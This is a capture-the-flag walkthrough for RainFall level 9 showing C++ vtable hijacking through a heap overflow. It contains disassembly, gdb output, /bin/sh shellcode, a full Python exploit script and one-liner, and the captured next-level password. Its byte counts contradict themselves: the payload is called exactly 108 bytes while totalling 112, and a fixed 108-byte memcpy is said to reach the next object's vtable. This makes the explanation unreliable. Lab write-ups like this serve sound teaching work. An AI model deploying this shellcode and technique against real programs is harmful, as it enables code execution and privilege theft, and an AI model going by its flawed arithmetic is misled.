# Level 9 - RainFall CTF Walkthrough: C++ Virtual Table Hijacking

## Challenge Overview
Level 9 is a C++ binary exploitation challenge that demonstrates virtual function table (vtable) hijacking through a heap buffer overflow. This is an advanced technique that exploits how C++ handles virtual function calls.

### Security Protections
```bash
level9@RainFall:~$ checksec level9
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x08048000)
```

**What this means:**
- **No RELRO**: Global Offset Table (GOT) is writable
- **No Stack Canary**: No stack overflow protection
- **NX disabled**: Memory is executable (shellcode can run)
- **No PIE**: Addresses are predictable and hardcoded

---

## Step 1: Understanding the Program Structure

### Basic Program Flow
```bash
level9@RainFall:~$ gdb -q level9
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

The program does the following:
1. Creates two C++ objects (N class instances)
2. Calls `setAnnotation()` on the first object with `argv[1]`
3. Makes a virtual function call on the second object

### Key Functions Analysis

#### Main Function Logic:
```assembly
0x08048610 <+28>:  movl   $0x6c,(%esp)          ; malloc(108)
0x08048617 <+35>:  call   0x8048530 <_Znwj@plt> ; operator new
0x08048629 <+53>:  call   0x80486f6 <_ZN1NC2Ei> ; N::N(5) - constructor
; ... creates second object ...
0x08048677 <+131>: call   0x804870e <_ZN1N13setAnnotationEPc> ; VULNERABLE!
0x08048680 <+140>: mov    (%eax),%eax          ; get vtable pointer
0x08048682 <+142>: mov    (%eax),%edx          ; get first virtual function
0x08048693 <+159>: call   *%edx               ; Virtual call - OUR TARGET!
```

#### The Vulnerable Function - N::setAnnotation():
```assembly
0x0804870e <+0>:   push   %ebp
0x08048714 <+6>:   mov    0x8(%ebp),%eax      ; this pointer
0x08048717 <+9>:   add    $0x4,%eax           ; this + 4 (skip vtable pointer)
0x0804871a <+12>:  mov    %eax,(%esp)         ; destination = this + 4
0x0804871d <+15>:  mov    0xc(%ebp),%eax      ; source = argv[1]
0x08048724 <+22>:  movl   $0x6c,0x8(%esp)    ; size = 108 bytes
0x0804872c <+30>:  call   0x8048510 <memcpy@plt> ; OVERFLOW HERE!
```

**🚨 The Bug:** `memcpy(this + 4, argv[1], 108)` copies 108 bytes without bounds checking!

---

## Step 2: Understanding C++ Virtual Function Calls

### How Virtual Function Calls Work

In C++, when you call a virtual function, the computer does this:
1. **Get the object**: Load the object's memory address
2. **Get the vtable pointer**: The first 4 bytes of every C++ object point to its vtable
3. **Get the function address**: Look up the function address in the vtable
4. **Call the function**: Jump to that address

**In Assembly:**
```assembly
mov    (%eax),%eax    ; Step 2: Get vtable pointer from object
mov    (%eax),%edx    ; Step 3: Get first function address from vtable
call   *%edx          ; Step 4: Call the function
```

### Memory Layout of C++ Objects

Each C++ object with virtual functions looks like this:
```
Object Layout (108 bytes total):
[0x00] Vtable Pointer (4 bytes) - Points to the virtual function table
[0x04] Data Buffer (104 bytes)  - Where setAnnotation writes
```

---

## Step 3: Finding the Memory Layout

### Discovering Object Addresses
```bash
(gdb) break *main+136  # Right after setAnnotation call
(gdb) run test
(gdb) info registers
eax            0x804a008    # Object1 address
```

Let's examine the heap:
```bash
(gdb) x/20x 0x804a008
0x804a008:  0x08048848  0x00000000  0x00000000  0x00000000  # Object1
0x804a018:  0x00000000  0x00000000  0x00000000  0x00000000
...
0x804a078:  0x08048848  0x00000000  0x00000000  0x00000000  # Object2
```

**Key Discovery:**
- **Object1**: `0x804a008` (vtable at 0x804a008, buffer at 0x804a00c)
- **Object2**: `0x804a078` (vtable at 0x804a078, buffer at 0x804a07c)
- **Distance**: `0x804a078 - 0x804a00c = 108 bytes` ✨

---

## Step 4: The Exploitation Strategy

### The Overflow Path
When `setAnnotation()` does `memcpy(this + 4, input, 108)`:
- **Starts at**: `0x804a00c` (Object1's buffer)
- **Writes 108 bytes**: From `0x804a00c` to `0x804a078`
- **Exactly reaches**: Object2's vtable pointer at `0x804a078`!

### Our Attack Plan
1. **Overwrite Object2's vtable pointer** to point to our fake vtable
2. **Create a fake vtable** in Object1's buffer that points to our shellcode
3. **Place shellcode** in Object1's buffer at a known address
4. **Trigger the virtual call** to execute our shellcode

### Visual Representation
```
BEFORE OVERFLOW:
Object1: [vtable_ptr][                buffer (104 bytes)               ]
         0x804a008   0x804a00c                                    0x804a074

Object2: [vtable_ptr][                buffer (104 bytes)               ]
         0x804a078   0x804a07c                                    0x804a0e0

AFTER OVERFLOW:
Object1: [vtable_ptr][fake_vtable][shellcode][    padding...    ]
         0x804a008   0x804a00c    0x804a010                0x804a074
                         ↑            ↑
                    points to →   our code
                    
Object2: [OVERWRITTEN][                buffer (104 bytes)               ]
         0x804a078    0x804a07c                                    0x804a0e0
              ↑
         points to 0x804a00c (our fake vtable)
```

---

## Step 5: Building the Exploit

### Shellcode Selection
We need compact shellcode that spawns `/bin/sh`. Here's 28-byte Linux execve shellcode:
```assembly
\x31\xc0                ; xor eax,eax
\x50                    ; push eax (null terminator)
\x68\x2f\x2f\x73\x68   ; push "//sh"
\x68\x2f\x62\x69\x6e   ; push "/bin"
\x89\xe3                ; mov ebx,esp (filename)
\x89\xc1                ; mov ecx,eax (argv = NULL)
\x89\xc2                ; mov edx,eax (envp = NULL)
\xb0\x0b                ; mov al,0xb (execve syscall)
\xcd\x80                ; int 0x80
\x31\xc0                ; xor eax,eax
\x40                    ; inc eax
\xcd\x80                ; int 0x80 (exit)
```

### Address Calculations
- **Object1 buffer starts**: `0x804a00c`
- **Fake vtable location**: `0x804a00c` (first 4 bytes of buffer)
- **Shellcode location**: `0x804a010` (right after fake vtable entry)
- **Vtable entry value**: `0x0804a010` (points to shellcode)
- **Overwrite target**: `0x804a078` (Object2's vtable pointer)
- **Overwrite value**: `0x0804a00c` (points to our fake vtable)

### Payload Structure
```python
payload = struct.pack("<I", 0x0804a010)  # Fake vtable entry (4 bytes)
payload += shellcode                      # Shellcode (28 bytes)
payload += "A" * 76                       # Padding (76 bytes)
payload += struct.pack("<I", 0x0804a00c)  # Overwrite Object2's vtable

# Total: 4 + 28 + 76 = 108 bytes exactly!
```

---

## Step 6: Putting It All Together

### Complete Exploit Script
```python
#!/usr/bin/env python
import struct

# Addresses
fake_vtable_addr = 0x0804a00c      # Where our fake vtable will be
shellcode_addr = 0x0804a010        # Where our shellcode will be

# 28-byte execve shellcode
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Build payload
payload = struct.pack("<I", shellcode_addr)  # Fake vtable entry
payload += shellcode                         # Our shellcode
payload += "A" * 76                         # Padding to reach 108 bytes
payload += struct.pack("<I", fake_vtable_addr)  # Overwrite Object2's vtable

print payload
```

### Running the Exploit
```bash
level9@RainFall:~$ ./level9 "$(python exploit.py)"
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

### One-Liner Version
```bash
level9@RainFall:~$ ./level9 $(python -c '
import struct
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload=struct.pack("<I",0x0804a010)+shellcode+"A"*76+struct.pack("<I",0x0804a00c)
print payload')
```

---

## Step 7: Understanding Why This Works

### The Execution Flow
1. **Setup Phase**: Two objects created on heap
2. **Overflow Phase**: `setAnnotation()` overflows Object1's buffer into Object2's vtable pointer
3. **Hijack Phase**: Object2's vtable now points to our fake vtable in Object1's buffer
4. **Execution Phase**: Virtual function call follows our controlled pointers to shellcode

### The Double Dereference
The key insight is understanding the double dereference in virtual calls:
```assembly
mov (%eax),%eax    ; Get vtable pointer (now points to 0x804a00c)
mov (%eax),%edx    ; Get function pointer (reads 0x804a010 from our fake vtable)
call *%edx         ; Execute shellcode at 0x804a010
```

---

## Debugging and Troubleshooting

### Common Issues and Solutions

#### 1. Wrong Addresses
**Problem**: Segmentation fault immediately
**Solution**: Verify object addresses with GDB
```bash
(gdb) break *main+136
(gdb) x $eax  # Should show Object1 address
```

#### 2. Shellcode Not Working
**Problem**: Program crashes during shellcode execution
**Solution**: Test shellcode separately
```bash
# Create test program to verify shellcode works
```

#### 3. Incorrect Payload Size
**Problem**: Not reaching Object2's vtable pointer
**Solution**: Verify exactly 108 bytes
```bash
python -c "print len(payload)"  # Should be exactly 108
```

### Verification Steps
1. **Check object addresses**: Ensure they're 108 bytes apart
2. **Verify overflow**: Confirm Object2's vtable gets overwritten
3. **Test shellcode**: Make sure shellcode executes properly
4. **Debug step by step**: Use GDB to follow execution

---

## Advanced Concepts Explained

### C++ Object Model
- **Vtable Layout**: Array of function pointers
- **Object Layout**: Vtable pointer followed by member data
- **Virtual Dispatch**: Runtime function resolution through vtables

### Heap Exploitation
- **Adjacent Objects**: Exploiting predictable heap layout
- **Metadata Corruption**: Overwriting object control structures
- **Precise Targeting**: Exact byte-level control needed

### Memory Protection Bypasses
- **NX Disabled**: Allows executable heap (shellcode injection)
- **No ASLR**: Predictable addresses enable hardcoded exploitation
- **No Stack Protection**: Not relevant for heap exploitation

---

## Key Learning Points

1. **C++ Internals Matter**: Understanding vtables is crucial for C++ exploitation
2. **Heap Layout Awareness**: Know where objects are placed in memory
3. **Precision is Critical**: Offsets and sizes must be exactly correct
4. **Double Dereference**: Virtual calls involve two levels of indirection
5. **Shellcode Skills**: Need compact, reliable shellcode for constrained spaces

## Security Implications

This vulnerability demonstrates:
- Why bounds checking is essential in C/C++
- How C++ virtual functions can be attack vectors
- The importance of modern memory protections (ASLR, NX, etc.)
- How heap layout can be predictable and exploitable

## Password for Bonus0
```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
